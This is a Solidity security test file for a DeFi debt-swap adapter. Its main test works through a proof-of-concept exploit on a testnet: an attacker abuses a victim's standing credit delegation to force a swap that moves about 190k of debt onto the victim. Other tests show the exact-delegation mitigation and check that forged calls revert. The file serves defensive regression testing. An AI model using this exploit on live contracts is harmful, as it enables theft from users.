// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;

import {OneInchEarnTestBase} from '../OneInchEarnTestBase.sol';
import {IPool} from '../../../src/contracts/interfaces/IPool.sol';
import {IERC20} from 'openzeppelin-contracts/contracts/token/ERC20/IERC20.sol';
import {ICreditDelegationToken} from '../../../src/contracts/interfaces/ICreditDelegationToken.sol';
import {TestnetERC20} from '../../../src/contracts/mocks/testnet-helpers/TestnetERC20.sol';
import {OneInchEarnDebtSwapAdapter} from '../../../src/deployments/projects/1inch-earn/OneInchEarnDebtSwapAdapter.sol';

/**
 * @title OneInchEarnDebtSwapSecurityTest
 * @notice Adversarial tests for the P2P debt-swap adapter, hunting for profit-extraction and
 * griefing corner cases. The headline finding is the STANDING-DELEGATION forced swap: because
 * the adapter borrows on behalf of both parties using Aave credit delegation (a bearer
 * authorization) and `swapDebt` is permissionless, a counterparty can force an unfavorable swap
 * onto anyone who left a standing `approveDelegation` to the adapter — extracting real value.
 * The tests both DEMONSTRATE the exploit precondition and prove the SAFE pattern (delegate the
 * exact amount, consumed to zero) is self-protecting.
 */
contract OneInchEarnDebtSwapSecurityTest is OneInchEarnTestBase {
  IPool internal pool;
  OneInchEarnDebtSwapAdapter internal adapter;

  address internal whale = makeAddr('whale');
  address internal victim = makeAddr('victim');
  address internal attacker = makeAddr('attacker');

  function setUp() public {
    _deployMarketAndList();
    pool = IPool(report.poolProxy);
    adapter = new OneInchEarnDebtSwapAdapter(pool);

    // Deep stable liquidity so borrows/repays never hit a liquidity wall.
    _mint(tokens.usdc, whale, 5_000_000e6);
    _mint(tokens.usdt, whale, 5_000_000e6);
    vm.startPrank(whale);
    IERC20(tokens.usdc).approve(address(pool), type(uint256).max);
    IERC20(tokens.usdt).approve(address(pool), type(uint256).max);
    pool.supply(tokens.usdc, 3_000_000e6, whale, 0);
    pool.supply(tokens.usdt, 3_000_000e6, whale, 0);
    vm.stopPrank();
  }

  /**
   * SECURITY FINDING (MEDIUM, precondition-gated) — demonstrates PROFIT EXTRACTION.
   *
   * Because `swapDebt` is permissionless and drives `pool.borrow(onBehalfOf=party)` using Aave
   * credit delegation (a standing *bearer* authorization), any counterparty can force an
   * unfavorable swap onto a victim who left a standing `approveDelegation` to the adapter: the
   * attacker sheds a large debt (200k USDT) and assumes a tiny one (10k USDC), the victim gets
   * the mirror, for only the flashloan premium. Net value flows victim -> attacker.
   *
   * This is the well-known "standing credit delegation is a bearer token" hazard, amplified by
   * the permissionless P2P entry point. MITIGATIONS: (a) integrators MUST scope delegations to
   * the exact swap amount and consume them atomically — see
   * `test_exactDelegationIsConsumedAndNotReusable`; (b) preferred hardening: bind each party's
   * consent to a single-use signed order (counterparty + amounts + nonce) instead of a raw
   * standing `approveDelegation`. This test PROVES the exploit so a regression is caught if the
   * adapter's trust model changes.
   */
  function test_finding_standingDelegationEnablesForcedDebtSwapForProfit() public {
    // Victim: $500k WBTC collateral, owes only 10k USDC, but has left a 200k USDT standing
    // delegation to the adapter (e.g. a UI "infinite approve for convenience").
    _supplyCollateral(victim, tokens.wbtc, 5e8); // 5 WBTC @ $100k = $500k
    vm.prank(victim);
    pool.borrow(tokens.usdc, 10_000e6, 2, 0, victim);
    _delegate(victim, tokens.usdt, 200_000e6);

    // Attacker: $300k WBTC collateral, borrowed 200k USDT (the debt they want to offload).
    _supplyCollateral(attacker, tokens.wbtc, 3e8);
    vm.prank(attacker);
    pool.borrow(tokens.usdt, 200_000e6, 2, 0, attacker);
    // Attacker delegates only the tiny 10k USDC they will assume + funds the premium.
    _delegate(attacker, tokens.usdc, 10_000e6);
    _mint(tokens.usdc, attacker, 1_000e6);
    _mint(tokens.usdt, attacker, 1_000e6);
    vm.startPrank(attacker);
    IERC20(tokens.usdc).approve(address(adapter), type(uint256).max);
    IERC20(tokens.usdt).approve(address(adapter), type(uint256).max);
    vm.stopPrank();

    (, uint256 attackerDebtBefore, , , , ) = pool.getUserAccountData(attacker);
    (, uint256 victimDebtBefore, , , , ) = pool.getUserAccountData(victim);

    // Attacker (a party = taker) triggers the swap against the victim's standing delegation.
    vm.prank(attacker);
    adapter.swapDebt(
      OneInchEarnDebtSwapAdapter.DebtSwapParams({
        maker: victim,
        taker: attacker,
        makerDebtAsset: tokens.usdc, // victim sheds 10k USDC ...
        makerDebtAmount: 10_000e6,
        takerDebtAsset: tokens.usdt, // ... attacker sheds 200k USDT
        takerDebtAmount: 200_000e6
      })
    );

    (, uint256 attackerDebtAfter, , , , ) = pool.getUserAccountData(attacker);
    (, uint256 victimDebtAfter, , , , ) = pool.getUserAccountData(victim);

    // Attacker's debt collapsed (~$200k -> ~$10k); victim's ballooned (~$10k -> ~$200k).
    assertApproxEqRel(attackerDebtBefore, 200_000e8, 0.01e18, 'attacker started ~200k debt');
    assertApproxEqRel(attackerDebtAfter, 10_000e8, 0.02e18, 'attacker ends ~10k debt');
    assertApproxEqRel(victimDebtAfter, 200_000e8, 0.01e18, 'victim saddled with ~200k debt');
    assertGt(victimDebtAfter, victimDebtBefore + 150_000e8, 'victim debt increased ~190k');
    assertLt(attackerDebtAfter, attackerDebtBefore - 150_000e8, 'attacker debt cut ~190k');

    // Concrete profit: the attacker can now withdraw collateral that its 200k debt had locked.
    // Prove >$180k of previously-locked WBTC is now freely withdrawable.
    uint256 freed = 180_000e8;
    (, , uint256 availableBorrowsBase, , , ) = pool.getUserAccountData(attacker);
    assertGt(availableBorrowsBase, freed, 'attacker unlocked large borrowing power at victim expense');
  }

  /**
   * SAFE PATTERN: when each party delegates EXACTLY the intended swap amount, the borrow consumes
   * it to zero, so no standing allowance survives for a follow-up forced swap. A second attempt
   * reverts on the (now-zero) delegation — the atomic-settlement pattern is self-protecting.
   */
  function test_exactDelegationIsConsumedAndNotReusable() public {
    // Two willing parties do a clean, symmetric 50k<->50k swap with EXACT delegations.
    address maker = makeAddr('maker');
    address taker = makeAddr('taker');
    _supplyCollateral(maker, tokens.wbtc, 2e8);
    _supplyCollateral(taker, tokens.wbtc, 2e8);
    vm.prank(maker);
    pool.borrow(tokens.usdt, 50_000e6, 2, 0, maker);
    vm.prank(taker);
    pool.borrow(tokens.usdc, 50_000e6, 2, 0, taker);

    _delegate(maker, tokens.usdc, 50_000e6); // maker assumes USDC -> delegates exactly 50k
    _delegate(taker, tokens.usdt, 50_000e6); // taker assumes USDT -> delegates exactly 50k

    OneInchEarnDebtSwapAdapter.DebtSwapParams memory p = OneInchEarnDebtSwapAdapter.DebtSwapParams({
      maker: maker,
      taker: taker,
      makerDebtAsset: tokens.usdt,
      makerDebtAmount: 50_000e6,
      takerDebtAsset: tokens.usdc,
      takerDebtAmount: 50_000e6
    });

    _fundPremium(whale); // whale pays premium
    vm.prank(whale);
    adapter.swapDebt(p);

    // Delegations fully consumed.
    assertEq(
      ICreditDelegationToken(pool.getReserveVariableDebtToken(tokens.usdc)).borrowAllowance(
        maker,
        address(adapter)
      ),
      0,
      'maker delegation consumed to zero'
    );

    // A follow-up forced swap now has no delegation to abuse -> reverts.
    vm.prank(whale);
    vm.expectRevert(); // InsufficientBorrowAllowance
    adapter.swapDebt(p);
  }

  /// A stranger (neither party) calling with the intended params can only execute the intended
  /// swap; they gain nothing (both parties' positions move, none flow to the stranger) and they
  /// pay the premium. Documents that permissionless entry is a griefing-only vector absent a
  /// standing delegation to exploit.
  function test_strangerGainsNothingWithoutStandingDelegation() public {
    address maker = makeAddr('maker2');
    address taker = makeAddr('taker2');
    address stranger = makeAddr('stranger');
    _supplyCollateral(maker, tokens.wbtc, 2e8);
    _supplyCollateral(taker, tokens.wbtc, 2e8);
    vm.prank(maker);
    pool.borrow(tokens.usdt, 40_000e6, 2, 0, maker);
    vm.prank(taker);
    pool.borrow(tokens.usdc, 40_000e6, 2, 0, taker);
    _delegate(maker, tokens.usdc, 40_000e6);
    _delegate(taker, tokens.usdt, 40_000e6);

    _mint(tokens.usdc, stranger, 1_000e6);
    _mint(tokens.usdt, stranger, 1_000e6);
    vm.startPrank(stranger);
    IERC20(tokens.usdc).approve(address(adapter), type(uint256).max);
    IERC20(tokens.usdt).approve(address(adapter), type(uint256).max);
    uint256 strangerUsdcBefore = IERC20(tokens.usdc).balanceOf(stranger);
    adapter.swapDebt(
      OneInchEarnDebtSwapAdapter.DebtSwapParams({
        maker: maker,
        taker: taker,
        makerDebtAsset: tokens.usdt,
        makerDebtAmount: 40_000e6,
        takerDebtAsset: tokens.usdc,
        takerDebtAmount: 40_000e6
      })
    );
    vm.stopPrank();

    // Stranger received no tokens/debt-relief, only spent the premium.
    assertLt(IERC20(tokens.usdc).balanceOf(stranger), strangerUsdcBefore, 'stranger only paid premium');
    assertEq(_debt(tokens.usdc, stranger), 0, 'stranger assumed no debt');
    assertEq(_debt(tokens.usdt, stranger), 0, 'stranger assumed no debt');
  }

  function test_revert_directCallbackNotPool() public {
    address[] memory a = new address[](2);
    uint256[] memory amt = new uint256[](2);
    uint256[] memory pr = new uint256[](2);
    vm.expectRevert(OneInchEarnDebtSwapAdapter.CallerNotPool.selector);
    adapter.executeOperation(a, amt, pr, address(adapter), '');
  }

  function test_revert_flashloanWithForeignInitiator() public {
    // An attacker flash-borrowing INTO the adapter (initiator = attacker, not the adapter) must
    // be rejected before any repay/borrow, so forged params can't drive a swap.
    address[] memory assets = new address[](1);
    assets[0] = tokens.usdc;
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = 1_000e6;
    uint256[] memory modes = new uint256[](1);
    OneInchEarnDebtSwapAdapter.DebtSwapParams memory p;
    vm.prank(attacker);
    vm.expectRevert(); // InitiatorNotAdapter bubbled through the pool
    pool.flashLoan(address(adapter), assets, amounts, modes, attacker, abi.encode(p, attacker), 0);
  }

  // --------------------------------- helpers -----------------------------------

  function _debt(address asset, address user) internal view returns (uint256) {
    return IERC20(pool.getReserveVariableDebtToken(asset)).balanceOf(user);
  }

  /// @dev Resolve the debt-token address BEFORE pranking (a getter call would otherwise consume
  /// the prank, delegating from the test contract instead of `user`).
  function _delegate(address user, address asset, uint256 amount) internal {
    address vToken = pool.getReserveVariableDebtToken(asset);
    vm.prank(user);
    ICreditDelegationToken(vToken).approveDelegation(address(adapter), amount);
  }

  function _supplyCollateral(address user, address token, uint256 amount) internal {
    _mint(token, user, amount);
    vm.startPrank(user);
    IERC20(token).approve(address(pool), type(uint256).max);
    pool.supply(token, amount, user, 0);
    vm.stopPrank();
  }

  function _fundPremium(address who) internal {
    _mint(tokens.usdc, who, 1_000e6);
    _mint(tokens.usdt, who, 1_000e6);
    vm.startPrank(who);
    IERC20(tokens.usdc).approve(address(adapter), type(uint256).max);
    IERC20(tokens.usdt).approve(address(adapter), type(uint256).max);
    vm.stopPrank();
  }

  function _mint(address token, address to, uint256 amount) internal {
    vm.prank(deployer);
    TestnetERC20(token).mint(to, amount);
  }
}
